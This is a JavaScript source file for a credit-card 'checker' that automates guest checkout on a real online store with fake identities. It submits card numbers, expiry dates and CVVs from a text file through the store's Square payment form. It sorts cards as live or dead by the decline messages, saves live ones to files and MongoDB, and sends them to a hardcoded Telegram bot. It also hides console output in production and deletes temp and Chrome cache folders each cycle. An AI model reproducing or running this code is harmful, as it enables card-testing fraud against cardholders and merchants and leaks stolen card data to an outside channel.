import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import fsPromises from 'fs/promises';
import path from 'path';
import puppeteer from 'puppeteer-core';
import { faker } from '@faker-js/faker';
import { Live } from './models/Live.js';
import { fileURLToPath } from 'url';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Ocultar mensajes de consola en producción
if (process.env.NODE_ENV === 'production') {
    console.log = () => {};
    console.error = () => {};
    console.warn = () => {};
    console.debug = () => {};
    console.info = () => {};
}

const TELEGRAM_TOKEN = '7461272757:AAEXQIGLnP9rEsLc2VAFahLZrPB9tjsasF0';
const TELEGRAM_CHAT_ID = '6912929677';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });



const CONFIG = {
    NAVEGACION: {
        PAGINA_CARGA: 6000,
        FORM_INPUT: 1000,
        CLICK_ESPERA: 2000
    },
    PAGO: {
        FRAME_BUSQUEDA: 4000,
        FRAME_MAX_INTENTOS: 5,
        INPUT_TARJETA: 2000,
        CONFIRMACION: 6000,
        POST_RESPUESTA: 1000
    },
    CICLO: {
        ENTRE_TARJETAS: 3000,
        ERROR_ESPERA: 5000
    }
};

// Funciones de utilidad globales
function actualizarDashboard(tipo, data) {
    try {
        if (!global.io) return;
        if (tipo === 'estado') {
            global.io.emit('update-dashboard', {
                tipo: 'estado',
                estado: 'running',
                mensaje: data
            });
        } else {
            const prefijo = tipo === 'live' ? '✨ LIVE' : '❌ DEAD';
            const mensaje_completo = `${prefijo} ElegbaGate (${data.mensaje}) - ${data.tarjeta}`;
            global.io.emit('update-dashboard', {
                tipo: tipo,
                mensaje_completo: mensaje_completo,
                data: data,
                _id: Date.now()
            });
        }
    } catch (error) {
        console.error('❌ Error al actualizar dashboard:', error);
    }
}

async function eliminarTarjetaProcesada(numeroTarjeta) {
    try {
        const tarjetasFile = path.join('C:\\Users\\efren\\OneDrive\\Escritorio\\PROYECTOPAGINA\\cards', 'tarjetas.txt');
        const contenido = fs.readFileSync(tarjetasFile, 'utf8');
        const tarjetas = contenido.split('\n').filter(line => line.trim());
        const nuevasTarjetas = tarjetas.filter(line => !line.includes(numeroTarjeta));
        fs.writeFileSync(tarjetasFile, nuevasTarjetas.join('\n') + '\n');

        const contenidoNuevo = fs.readFileSync(tarjetasFile, 'utf8');
        const tarjetaEliminada = !contenidoNuevo.includes(numeroTarjeta);

        if (tarjetaEliminada) {
            console.log(`🗑️ Tarjeta ${numeroTarjeta} eliminada correctamente`);
        } else {
            console.log(`⚠️ Error: No se pudo eliminar la tarjeta ${numeroTarjeta}`);
        }

        const tarjetasRestantes = contenidoNuevo.split('\n').filter(line => line.trim()).length;
        console.log(`📊 Tarjetas restantes: ${tarjetasRestantes}`);

    } catch (error) {
        console.error('❌ Error al eliminar tarjeta:', error);
    }
}

async function registrarChequeo({ key, numero, resultado, mensaje }) {
    try {
        console.log(`📝 Registrando chequeo para tarjeta ${numero}`);
        console.log(`Resultado: ${resultado}`);
        console.log(`Mensaje: ${mensaje}`);
        return true;
    } catch (error) {
        console.error('❌ Error al registrar chequeo:', error);
        return false;
    }
}

async function leerTarjetas() {
    try {
        const tarjetasFile = path.join(__dirname, 'cards', 'tarjetas.txt');

        if (!fs.existsSync(tarjetasFile)) {
            console.error('El archivo de tarjetas no existe:', tarjetasFile);
            return [];
        }

        const contenido = fs.readFileSync(tarjetasFile, 'utf8');
        console.log('Contenido del archivo:', contenido);

        if (!contenido.trim()) {
            console.log('El archivo de tarjetas está vacío.');
            return [];
        }

        const tarjetas = contenido
            .split('\n')
            .filter(line => line.trim())
            .map(line => {
                const [numero, mes, año, cvv] = line.split('|');
                return {
                    numero: numero?.trim(),
                    fecha: `${mes?.trim()}/${año?.trim()?.slice(-2)}`,
                    cvv: cvv?.trim(),
                    postalCode: '33101'
                };
            });

        console.log(`Total de tarjetas leídas: ${tarjetas.length}`);
        return tarjetas;
    } catch (error) {
        console.error('Error al leer tarjetas:', error);
        return [];
    }
}

function generarDatosFalsos() {
    const firstName = faker.person.firstName();
    const lastName = faker.person.lastName();
    const address = faker.location.streetAddress();
    const city = faker.location.city();
    const state = 'Florida';
    const state_id = '3630';
    const postcode = faker.location.zipCode('#####');
    const phone = faker.string.numeric(10);
    const email = faker.internet.email({ firstName, lastName }).toLowerCase();
    const company = faker.company.name();

    return {
        firstName,
        lastName,
        email,
        phone,
        company,
        address,
        city,
        state,
        state_id,
        postcode
    };
}

export class ElegbaGateChecker {
    constructor(userId) {
        this.userId = userId;
        this.browser = null;
        this.page = null;
        this.datosFalsos = generarDatosFalsos();
        this.files = {
            tarjetas: path.join(__dirname, 'cards', 'tarjetas.txt'),
            liveCvv: path.join(__dirname, 'cards', 'live_cvv.txt'),
            liveFunds: path.join(__dirname, 'cards', 'live_funds.txt'),
            liveCharged: path.join(__dirname, 'cards', 'live_charged.txt'),
            dead: path.join(__dirname, 'cards', 'dead.txt')
        };
    }

    // Métodos de navegación
    async inicializar() {
        try {
            console.log('🚀 Iniciando simulador...');
            
            if (global.io) {
                global.io.emit('update-dashboard', {
                    tipo: 'estado',
                    mensaje: '🚀 Iniciando...',
                    estado: 'running'
                });
            }

            const launchOptions = {
                headless: "new",
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-accelerated-2d-canvas',
                    '--disable-gpu',
                    '--window-size=1920,1080',
                    '--incognito'
                ]
            };

            console.log('📦 Configurando opciones de lanzamiento:', JSON.stringify(launchOptions));
            this.browser = await puppeteer.launch(launchOptions);
            console.log('🌐 Navegador iniciado correctamente');

            const pages = await this.browser.pages();
            this.page = pages[0];
            console.log('📄 Página principal obtenida');

            await this.page.setDefaultTimeout(30000); // Aumentamos el timeout a 30 segundos
            await this.page.setDefaultNavigationTimeout(40000); // Aumentamos el timeout de navegación a 40 segundos
            
            console.log('⚙️ Timeouts configurados');
            console.log('✅ Simulador iniciado correctamente');
            
            return true;
        } catch (error) {
            console.error('❌ Error crítico iniciando el navegador:', error);
            if (global.io) {
                global.io.emit('update-dashboard', {
                    tipo: 'estado',
                    mensaje: `Error iniciando: ${error.message}`,
                    estado: 'error'
                });
            }
            throw error;
        }
    }

    async seleccionarProducto() {
        try {
            console.log('🛍️ Navegando a la página del producto...');
            await this.page.goto('https://www.selfedge.com/index.php?route=product/product&product_id=2626&sort=ps.price&order=ASC', {
                waitUntil: 'domcontentloaded',
                timeout: CONFIG.NAVEGACION.PAGINA_CARGA
            });
            await this.esperar(CONFIG.NAVEGACION.PAGINA_CARGA);

            console.log('👕 Seleccionando talla...');
            await this.page.waitForSelector('label[for="input-option-value9383"]', { timeout: 4000 });
            await this.page.click('label[for="input-option-value9383"]');
            await this.esperar(CONFIG.NAVEGACION.FORM_INPUT);

            console.log('🛒 Agregando al carrito...');
            await this.page.waitForSelector('#button-cart', { timeout: 4000 });
            await this.page.click('#button-cart');
            await this.esperar(CONFIG.NAVEGACION.CLICK_ESPERA);

            console.log('🛍️ Yendo al carrito...');
            await this.page.goto('https://www.selfedge.com/index.php?route=checkout/cart', {
                waitUntil: 'domcontentloaded',
                timeout: CONFIG.NAVEGACION.PAGINA_CARGA
            });
            await this.esperar(CONFIG.NAVEGACION.PAGINA_CARGA);

            console.log('💳 Buscando botón de checkout...');
            await this.esperar(2000);
            await this.page.evaluate(() => {
                const buttons = Array.from(document.querySelectorAll('button, a'));
                const checkoutBtn = buttons.find(button =>
                    button.textContent.toLowerCase().includes('checkout') ||
                    button.textContent.toLowerCase().includes('proceed')
                );
                if (checkoutBtn) checkoutBtn.click();
            });
            await this.esperar(CONFIG.NAVEGACION.CLICK_ESPERA);

            console.log('👤 Buscando botón Guest Checkout...');
            await this.esperar(2000);
            await this.page.waitForFunction(() => {
                const buttons = Array.from(document.querySelectorAll('button, input[type="button"], a'));
                return buttons.find(btn => 
                    btn.id === 'button-guest-checkout' || 
                    btn.textContent.toLowerCase().includes('guest checkout') ||
                    btn.value?.toLowerCase().includes('guest checkout')
                );
            }, { timeout: 5000 });
            
            await this.page.evaluate(() => {
                const buttons = Array.from(document.querySelectorAll('button, input[type="button"], a'));
                const guestButton = buttons.find(btn => 
                    btn.id === 'button-guest-checkout' || 
                    btn.textContent.toLowerCase().includes('guest checkout') ||
                    btn.value?.toLowerCase().includes('guest checkout')
                );
                if (guestButton) guestButton.click();
            });

            await this.esperar(CONFIG.NAVEGACION.CLICK_ESPERA);

        } catch (error) {
            console.error('❌ Error en seleccionarProducto:', error);
            throw error;
        }
    }

    async llenarFormulario() {
        try {
            actualizarDashboard('proceso', '📝 Ingresando datos...');
            console.log('📝 Llenando formulario de checkout...');
            await this.esperar(4000);
    
            // Primero verificamos si necesitamos hacer clic en Guest Checkout
            const needsGuestCheckout = await this.page.evaluate(() => {
                return !document.querySelector('#input-payment-email') && 
                       (document.querySelector('#button-guest-checkout') || 
                        document.querySelector('button:contains("Guest Checkout")'));
            });
    
            if (needsGuestCheckout) {
                console.log('🔍 Buscando y haciendo clic en Guest Checkout...');
                await this.page.evaluate(() => {
                    const guestBtn = document.querySelector('#button-guest-checkout') || 
                                   Array.from(document.querySelectorAll('button')).find(el => 
                                       el.textContent.toLowerCase().includes('guest checkout'));
                    if (guestBtn) {
                        guestBtn.click();
                        console.log('✅ Botón Guest Checkout encontrado y clickeado');
                    }
                });
                await this.esperar(CONFIG.NAVEGACION.CLICK_ESPERA);
                
                // Esperamos a que aparezca el formulario
                await this.page.waitForSelector('#input-payment-email', { 
                    visible: true, 
                    timeout: 10000 
                });
            }
    
            console.log('📧 Llenando correo electrónico...');
            await this.page.waitForSelector('#input-payment-email', { visible: true, timeout: 10000 });
            await this.page.type('#input-payment-email', this.datosFalsos.email, {delay: 3});
            console.log('✅ Correo electrónico llenado:', this.datosFalsos.email);
    
            const campos = {
                'firstname': {
                    selector: '#input-payment-firstname',
                    valor: this.datosFalsos.firstName
                },
                'lastname': {
                    selector: '#input-payment-lastname',
                    valor: this.datosFalsos.lastName
                },
                'telephone': {
                    selector: '#input-payment-telephone',
                    valor: this.datosFalsos.phone
                },
                'address_1': {
                    selector: '#input-payment-address-1',
                    valor: this.datosFalsos.address
                },
                'city': {
                    selector: '#input-payment-city',
                    valor: this.datosFalsos.city
                },
                'postcode': {
                    selector: '#input-payment-postcode',
                    valor: this.datosFalsos.postcode
                }
            };
    
            for (const [campo, data] of Object.entries(campos)) {
                try {
                    await this.page.waitForSelector(data.selector, { visible: true, timeout: 6000 });
                    await this.page.type(data.selector, data.valor, {delay: 4});
                    console.log(`✅ Campo ${campo} llenado: ${data.valor}`);
                    await this.esperar(CONFIG.NAVEGACION.FORM_INPUT);
                } catch (error) {
                    console.error(`❌ Error al llenar campo ${campo}:`, error);
                    // Tomar screenshot del error
                    await this.page.screenshot({ path: `error-campo-${campo}.png` });
                    throw error;
                }
            }
    
            console.log('🌎 Seleccionando Estados Unidos...');
            await this.page.waitForSelector('select[name="country_id"]', { visible: true, timeout: 4000 });
            await this.page.select('select[name="country_id"]', '223');
            await this.esperar(CONFIG.NAVEGACION.FORM_INPUT);
    
            console.log(`🏠 Seleccionando ${this.datosFalsos.state}...`);
            await this.page.waitForSelector('#input-payment-zone', { visible: true, timeout: 4000 });
            await this.page.select('#input-payment-zone', this.datosFalsos.state_id);
            console.log(`✅ Estado seleccionado: ${this.datosFalsos.state}`);
            await this.esperar(CONFIG.NAVEGACION.FORM_INPUT);
    
            console.log('➡️ Haciendo clic en Continue...');
            await this.page.waitForSelector('#button-guest', { visible: true, timeout: 4000 });
            await this.page.click('#button-guest');
            await this.esperar(CONFIG.NAVEGACION.CLICK_ESPERA);
    
        } catch (error) {
            console.error('❌ Error en llenarFormulario:', error);
            // Tomar screenshot del error general
            await this.page.screenshot({ path: 'error-formulario.png' });
            throw error;
    
      
        }
    } 

    async llenarFormularioEnvio() {
        try {
            console.log('�� Llenando formulario de Delivery Details...');

            const campos = {
                'firstname': ['#input-shipping-firstname', this.datosFalsos.firstName],
                'lastname': ['#input-shipping-lastname', this.datosFalsos.lastName],
                'telephone': ['#input-shipping-telephone', this.datosFalsos.phone],
                'address_1': ['#input-shipping-address-1', this.datosFalsos.address],
                'city': ['#input-shipping-city', this.datosFalsos.city],
                'postcode': ['#input-shipping-postcode', this.datosFalsos.postcode]
            };

            for (const [campo, [selector, valor]] of Object.entries(campos)) {
                await this.page.waitForSelector(selector, { visible: true, timeout: 5000 });
                await this.page.type(selector, valor, {delay: 3});
                console.log(`✅ Campo de envío ${campo} llenado: ${valor}`);
                await this.esperar(CONFIG.NAVEGACION.FORM_INPUT);
            }

            console.log(`🏠 Seleccionando estado de envío ${this.datosFalsos.state}...`);
            await this.page.select('#input-shipping-zone', this.datosFalsos.state_id);
            console.log(`✅ Estado de envío seleccionado: ${this.datosFalsos.state}`);
            await this.esperar(CONFIG.NAVEGACION.FORM_INPUT);

            console.log('➡�� Haciendo clic en Continue de envío...');
            await this.page.click('#button-guest-shipping');
            await this.esperar(CONFIG.NAVEGACION.CLICK_ESPERA);

        } catch (error) {
            console.error('❌ Error en llenarFormularioEnvio:', error);
            throw error;
        }
    }

    async procesarPago(datosTarjeta) {
        try {
            actualizarDashboard('estado', '🔄 Iniciando proceso de pago...');

            // Esperar y seleccionar específicamente el método Square
            await this.page.waitForSelector('input[name="payment_method"][value="squareup"]', { 
                visible: true,
                timeout: 6000 
            });
            await this.page.evaluate(() => {
                const inputs = document.querySelectorAll('input[name="payment_method"]');
                inputs.forEach(input => input.checked = false);  // Desmarcar todos primero
                const square = document.querySelector('input[name="payment_method"][value="squareup"]');
                if (square) square.click();
            });

            await this.esperar(CONFIG.NAVEGACION.CLICK_ESPERA);

            actualizarDashboard('estado', '📝 Aceptando términos...');
            await this.page.waitForSelector('input[name="agree"]', { timeout: 3000 });
            await this.page.click('input[name="agree"]');
            await this.esperar(CONFIG.NAVEGACION.CLICK_ESPERA);

            await this.page.click('#button-payment-method');
            await this.esperar(CONFIG.PAGO.CONFIRMACION);

            actualizarDashboard('estado', '💳 Buscando formulario de tarjeta...');
            await this.esperar(CONFIG.PAGO.FRAME_BUSQUEDA);

            let squareFrame = null;
            let intentos = 0;

            while (!squareFrame && intentos < CONFIG.PAGO.FRAME_MAX_INTENTOS) {
                const frames = await this.page.frames();
                
                for (const frame of frames) {
                    const url = frame.url();
                    if (url.includes('single-card-element-iframe.html')) {
                        squareFrame = frame;
                        actualizarDashboard('estado', '✅ Frame de pago encontrado');
                        break;
                    }
                }

                if (!squareFrame) {
                    await this.esperar(CONFIG.PAGO.FRAME_BUSQUEDA);
                    intentos++;
                }
            }

            if (squareFrame) {
                await this.esperar(CONFIG.PAGO.INPUT_TARJETA);

                actualizarDashboard('estado', '💳 Ingresando número de tarjeta...');
                await squareFrame.waitForSelector('#cardNumber', { visible: true, timeout: 5000 });
                await squareFrame.type('#cardNumber', datosTarjeta.numero, { delay: 3 });
                await this.esperar(CONFIG.PAGO.INPUT_TARJETA);

                actualizarDashboard('estado', '📅 Ingresando fecha de vencimiento...');
                await squareFrame.waitForSelector('#expirationDate', { visible: true, timeout: 5000 });
                await squareFrame.type('#expirationDate', datosTarjeta.fecha, { delay: 3 });
                await this.esperar(CONFIG.PAGO.INPUT_TARJETA);

                actualizarDashboard('estado', '🔒 Ingresando CVV...');
                await squareFrame.waitForSelector('#cvv', { visible: true, timeout: 5000 });
                await squareFrame.type('#cvv', datosTarjeta.cvv, { delay: 3 });
                await this.esperar(CONFIG.PAGO.INPUT_TARJETA);

                try {
                    const postalCodeExists = await squareFrame.waitForSelector('#postalCode', {
                        visible: true,
                        timeout: 3000
                    }).then(() => true).catch(() => false);

                    if (postalCodeExists) {
                        datosTarjeta.postalCode = this.datosFalsos.postcode;
                        await squareFrame.type('#postalCode', datosTarjeta.postalCode, { delay: 3 });
                        await this.esperar(CONFIG.PAGO.INPUT_TARJETA);
                    }
                } catch (e) {
                    actualizarDashboard('estado', 'ℹ️ No se requiere código postal');
                }

                actualizarDashboard('estado', '🔒 Confirmando orden...');
                await this.page.waitForSelector('#button-confirm-order', { timeout: 3000 });
                await this.page.click('#button-confirm-order');

                actualizarDashboard('estado', '🔍 Verificando respuesta...');
                await this.esperar(CONFIG.PAGO.CONFIRMACION);

                try {
                    const respuestaSelector = '.alert, .alert-danger, .error, .success, #error-message, .message';
                    await this.page.waitForSelector(respuestaSelector, {
                        timeout: 15000
                    });

                    const mensaje = await this.page.evaluate((selector) => {
                        const elementos = document.querySelectorAll(selector);
                        return Array.from(elementos)
                            .map(el => el.textContent.trim())
                            .join(' ')
                            .replace(/×/g, '')
                            .replace(/\s+/g, ' ')
                            .trim();
                    }, respuestaSelector);

                    actualizarDashboard('estado', '📝 Procesando respuesta...');
                    await this.verificarRespuesta(mensaje, datosTarjeta);
                } catch (error) {
                    await this.verificarRespuesta('expired card', datosTarjeta);
                }

                await eliminarTarjetaProcesada(datosTarjeta.numero);

            } else {
                throw new Error('Frame no encontrado');
            }

        } catch (error) {
            actualizarDashboard('estado', '❌ Error en el proceso de pago');
            await this.page.screenshot({ path: 'error-pago.png', fullPage: true });
            throw error;
        }
    }
    
    async cerrar() {
        try {
            console.log('Intentando cerrar la página y el navegador...');
            if (this.page) {
                await this.page.close().catch(() => {});
                this.page = null;
                console.log('Página cerrada.');
            }
            if (this.browser) {
                const browserProcess = this.browser.process();
                await this.browser.close().catch(() => {});
                if (browserProcess) {
                    process.kill(browserProcess.pid, 'SIGKILL');
                }
                this.browser = null;
                console.log('Navegador cerrado.');
            }
            await execAsync('taskkill /F /IM chrome.exe').catch(() => {});
            console.log('Procesos de Chrome terminados.');

            if (global.io) {
                global.io.emit('update-dashboard', {
                    tipo: 'estado',
                    mensaje: '🛑 Deteniendo checker...',
                    estado: 'stopping'
                });
            }
            if (global.io) {
                global.io.emit('update-dashboard', {
                    tipo: 'estado',
                    mensaje: '🔥 ¡Gate Cargado!',
                    estado: 'stopped'
                });
            }
        } catch (error) {
            console.error('Error cerrando:', error);
            await execAsync('taskkill /F /IM chrome.exe').catch(() => {});
        }
    }

    async esperar(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async verificarRespuesta(mensaje, tarjeta) {
        mensaje = mensaje.toLowerCase();
        let tipo, estado;

        const enviarActualizacion = (tipoTarjeta, estadoTarjeta, mensajeTarjeta) => {
            const data = {
                tarjeta: `${tarjeta.numero}|${tarjeta.fecha}|${tarjeta.cvv}`,
                estado: estadoTarjeta,
                mensaje: mensajeTarjeta
            };
            console.log('✅ Enviando actualización:', data);
            actualizarDashboard(tipoTarjeta, data);
        };

        try {
            // Verificar cada caso
            if (mensaje.includes('unexpected decline') && mensaje.includes('invalid card postal code')) {
                enviarActualizacion('dead', 'DECLINED', 'Decline Inesperado + AVS');
                tipo = 'DEAD';
                estado = 'Declined: Unexpected decline + AVS';
            }
            else if (mensaje.includes('incorrect card number')) {
                enviarActualizacion('dead', 'DECLINED', 'Número Incorrecto');
                tipo = 'DEAD';
                estado = 'Declined: Incorrect Card Number';
            }
            else if (mensaje.includes('payment amount is not within the allowed limits') &&
                     mensaje.includes('invalid card postal code') &&
                     mensaje.includes('card cvv is incorrect')) {
                enviarActualizacion('live', 'APPROVED', 'Error de Límite + AVS + CVV');
                tipo = 'CVV';
                estado = 'Live: Amount/AVS/CVV Error';
                await this.enviarTelegram('LIVE CVV ENCONTRADA', 'Error de Límite + AVS + CVV', tarjeta, mensaje);
            }
            else if (mensaje.includes('payment amount is not within the allowed limits') &&
                     mensaje.includes('invalid card postal code')) {
                enviarActualizacion('live', 'APPROVED', 'Error de Límite + AVS');
                tipo = 'CVV';
                estado = 'Live: Amount/AVS Error';
                await this.enviarTelegram('LIVE CVV ENCONTRADA', 'Error de Límite + AVS', tarjeta, mensaje);
            }
            else if (mensaje.includes('invalid card postal code')) {
                enviarActualizacion('live', 'APPROVED', 'Error AVS');
                tipo = 'CVV';
                estado = 'Live: AVS Error';
                await this.enviarTelegram('LIVE CVV ENCONTRADA', 'Error AVS', tarjeta, mensaje);
            }
            else if (mensaje.includes('payment amount is not within the allowed limits')) {
                enviarActualizacion('live', 'APPROVED', 'Error de Límite');
                tipo = 'CVV';
                estado = 'Live: Amount Limit';
                await this.enviarTelegram('LIVE CVV ENCONTRADA', 'Error de Límite', tarjeta, mensaje);
            }
            else if (mensaje.includes('card is expired')) {
                enviarActualizacion('dead', 'DECLINED', 'Tarjeta Expirada');
                tipo = 'DEAD';
                estado = 'Declined: Card Expired';
            }
            else if (mensaje.includes('unexpected decline')) {
                enviarActualizacion('dead', 'DECLINED', 'Decline Inesperado');
                tipo = 'DEAD';
                estado = 'Declined: Unexpected decline';
            }
            else if (mensaje.includes('cvv') || mensaje.includes('cvc') || mensaje.includes('security code')) {
                enviarActualizacion('live', 'APPROVED', 'Error CVV');
                tipo = 'CVV';
                estado = 'Live: CVV Error';
                await this.enviarTelegram('LIVE CVV ENCONTRADA', 'Error CVV', tarjeta, mensaje);
            }
            else if (mensaje.includes('fund') || mensaje.includes('insufficient') || mensaje.includes('saldo')) {
                enviarActualizacion('live', 'APPROVED', 'Fondos Insuficientes');
                tipo = 'FUNDS';
                estado = 'Live: Insufficient funds';
                await this.enviarTelegram('LIVE FUNDS ENCONTRADA', 'Fondos Insuficientes', tarjeta, mensaje);
            }
            else {
                enviarActualizacion('dead', 'DECLINED', mensaje);
                tipo = 'DEAD';
                estado = `Declined: ${mensaje}`;
            }

            // Guardar resultado y registrar chequeo
            await this.guardarResultado(tipo, tarjeta, estado);
            actualizarDashboard('proceso', `Resultado guardado para: ${tarjeta.numero}`);

            await registrarChequeo({
                key: 'ALEMAN2024',
                numero: tarjeta.numero,
                resultado: tipo,
                mensaje: estado
            });

        } catch (error) {
            console.error('Error en verificarRespuesta:', error);
            actualizarDashboard('estado', 'Error al verificar respuesta');
        }
    }

    async guardarResultado(tipo, tarjeta, mensaje) {
        const fecha = new Date().toISOString().replace('T', ' ').substring(0, 19);
        const resultado = `[${fecha}] ${tarjeta.numero}|${tarjeta.fecha}|${tarjeta.cvv}|${tarjeta.postalCode} - ${mensaje}\n`;

        try {
            // Guardar en archivos
            switch(tipo) {
                case 'CVV':
                    await fs.promises.appendFile(this.files.liveCvv, resultado);
                    console.log('💳 Guardado en live_cvv.txt');
                    // Guardar en MongoDB
                    await this.guardarEnMongo(tipo, tarjeta, mensaje);
                    break;
                case 'FUNDS':
                    await fs.promises.appendFile(this.files.liveFunds, resultado);
                    console.log('💰 Guardado en live_funds.txt');
                    // Guardar en MongoDB
                    await this.guardarEnMongo(tipo, tarjeta, mensaje);
                    break;
                case 'CHARGED':
                    await fs.promises.appendFile(this.files.liveCharged, resultado);
                    console.log('✅ Guardado en live_charged.txt');
                    // Guardar en MongoDB
                    await this.guardarEnMongo(tipo, tarjeta, mensaje);
                    break;
                case 'DEAD':
                    await fs.promises.appendFile(this.files.dead, resultado);
                    console.log('💳 Guardado en dead.txt');
                    break;
            }
            await this.esperar(CONFIG.PAGO.POST_RESPUESTA);
        } catch (error) {
            console.error('Error al guardar resultado:', error);
        }
    }

    async guardarEnMongo(tipo, tarjeta, mensaje) {
        try {
            const liveEntry = new Live({
                cardNumber: tarjeta.numero,
                month: tarjeta.fecha.slice(0,2),
                year: `20${tarjeta.fecha.slice(2)}`,
                cvv: tarjeta.cvv,
                result: tipo,
                message: mensaje,
                gate: 'elegbagate',
                userId: this.userId,
                createdAt: new Date()
            });

            await liveEntry.save();
            console.log('💾 Live guardada en MongoDB:', {
                card: tarjeta.numero,
                userId: this.userId,
                gate: 'elegbagate'
            });

            // Emitir evento para actualizar contador total
            if (global.io) {
                global.io.emit('update-total-lives');
            }
        } catch (mongoError) {
            console.error('Error guardando en MongoDB:', mongoError);
        }
    }

    async enviarTelegram(tipoMensaje, razon, tarjeta, mensaje) {
        const mensajeTelegram = `
🔔 <b>${tipoMensaje}</b>

💳 <b>Detalles de la Tarjeta:</b>
CC: ${tarjeta.numero}|${tarjeta.fecha}|${tarjeta.cvv}
✅ Estado: ${razon}
🏦 Gate: ElegbaGate
⏰ Hora: ${new Date().toLocaleString()}

#Live #Aleman2024`;

        try {
            await bot.sendMessage(TELEGRAM_CHAT_ID, mensajeTelegram, { 
                parse_mode: 'HTML',
                disable_web_page_preview: true 
            });
            console.log('✅ Mensaje enviado a Telegram');
        } catch (error) {
            console.error('❌ Error al enviar mensaje a Telegram:', error);
        }
    }

    async compraRapida() {
        try {
            console.log('👕 Seleccionando talla...');
            await this.page.waitForSelector('.product-form__input');
            await new Promise(resolve => setTimeout(resolve, 1000));

            console.log('🛒 Agregando al carrito...');
            await this.page.click('button[name="add"]');
            await new Promise(resolve => setTimeout(resolve, 2000));

            console.log('🛍️ Yendo al carrito...');
            await this.page.waitForSelector('.cart-notification__links');
            await this.page.click('.cart-notification__links a');
            await new Promise(resolve => setTimeout(resolve, 2000));

            console.log('💳 Buscando botón de checkout...');
            await this.page.waitForSelector('button[name="checkout"]');
            await this.page.click('button[name="checkout"]');
            await new Promise(resolve => setTimeout(resolve, 2000));

            console.log('👤 Buscando botón Guest Checkout...');
            await this.page.waitForSelector('#button-guest-checkout', { timeout: 5000 });
            await this.page.click('#button-guest-checkout');

        } catch (error) {
            console.error('❌ Error en compraRapida:', error);
            throw error;
        }
    }
}

async function main(userId) {
    console.log('=== Iniciando Proceso de Compra ===');
    let checker = null;

    global.checkerActivo = true;
    global.stopSignal = false;

    while (global.checkerActivo) {
        try {
            // Verificar señal de parada
            if (global.stopSignal) {
                console.log('Señal de parada detectada, deteniendo proceso...');
                if (checker && checker.browser) {
                    try {
                        const browserProcess = checker.browser.process();
                        if (browserProcess) {
                            process.kill(browserProcess.pid, 'SIGKILL');
                        }
                    } catch (e) {
                        console.log('Error al cerrar navegador:', e);
                    }
                }
                checker = null;
                break;
            }

            // Limpiar caché antes de cada ciclo
            try {
                await execAsync('del /f /s /q "%temp%\\*"');
                await execAsync('del /f /s /q "C:\\Users\\%username%\\AppData\\Local\\Temp\\*"');
                console.log('🧹 Caché limpiada');
            } catch (e) {
                console.log('⚠️ Error limpiando caché:', e);
            }

            const tarjetas = await leerTarjetas();
            if (tarjetas.length === 0) break;

            checker = new ElegbaGateChecker(userId);
            
            try {
                if (!global.stopSignal) {
                    console.log(`\n=== 💳 Procesando tarjeta: ${tarjetas[0].numero} ===`);
                    await checker.inicializar();
                }
                
                if (!global.stopSignal) {
                    await checker.seleccionarProducto();
                }
                
                if (!global.stopSignal) {
                    await checker.llenarFormulario();
                }
                
                if (!global.stopSignal) {
                    await checker.llenarFormularioEnvio();
                }
                
                if (!global.stopSignal) {
                    await checker.procesarPago(tarjetas[0]);
                    // Aumentar tiempo de espera para ver la respuesta
                    await checker.esperar(8000);
                }

            } catch (error) {
                if (!global.stopSignal) {
                    console.error(`❌ Error procesando tarjeta:`, error);
                    await eliminarTarjetaProcesada(tarjetas[0].numero);
                    
                    // Notificar al frontend del error y reinicio
                    if (global.io) {
                        global.io.emit('update-dashboard', {
                            tipo: 'estado',
                            estado: 'error',
                            mensaje: '❌ Error detectado - Reiniciando proceso...'
                        });
                    }
                    
                    // Limpiar caché y temporales en caso de error
                    console.log('🧹 Limpiando caché después del error...');
                    try {
                        await execAsync('del /f /s /q "%temp%\\*"');
                        await execAsync('del /f /s /q "C:\\Users\\%username%\\AppData\\Local\\Temp\\*"');
                        await execAsync('del /f /s /q "C:\\Users\\%username%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\*"');
                        console.log('✅ Caché limpiada después del error');
                    } catch (e) {
                        console.log('⚠️ Error limpiando caché:', e);
                    }
                    
                    // Esperar en caso de error
                    await checker.esperar(5000);
                    
                    // Cerrar el navegador actual si existe
                    if (checker && checker.browser) {
                        await checker.cerrar();
                    }
                    
                    // Reiniciar el checker
                    checker = null;
                    console.log('🔄 Reiniciando proceso después del error...');
                    
                    // Notificar que el proceso se reiniciará
                    if (global.io) {
                        global.io.emit('update-dashboard', {
                            tipo: 'estado',
                            estado: 'restarting',
                            mensaje: '🔄 Reiniciando proceso...'
                        });
                    }
                    
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    continue;  // Volver al inicio del ciclo
                }
            } finally {
                // Asegurar que el navegador se cierre al terminar cada ciclo
                if (checker && checker.browser) {
                    await checker.cerrar();
                    checker = null;
                }
            }

        } catch (error) {
            if (global.stopSignal) break;
            console.error('❌ Error en el ciclo principal:', error);
            await new Promise(resolve => setTimeout(resolve, 500));
        }
    }

    // Asegurar que todo se cierre al finalizar
    if (checker && checker.browser) {
        await checker.cerrar();
        checker = null;
    }

    // Forzar cierre de cualquier proceso de Chrome restante
    try {
        await execAsync('taskkill /F /IM chrome.exe').catch(() => {});
    } catch (error) {
        console.error('Error al forzar cierre de Chrome:', error);
    }

    console.log('=== ✅ Proceso Completado ===');
}

export { main };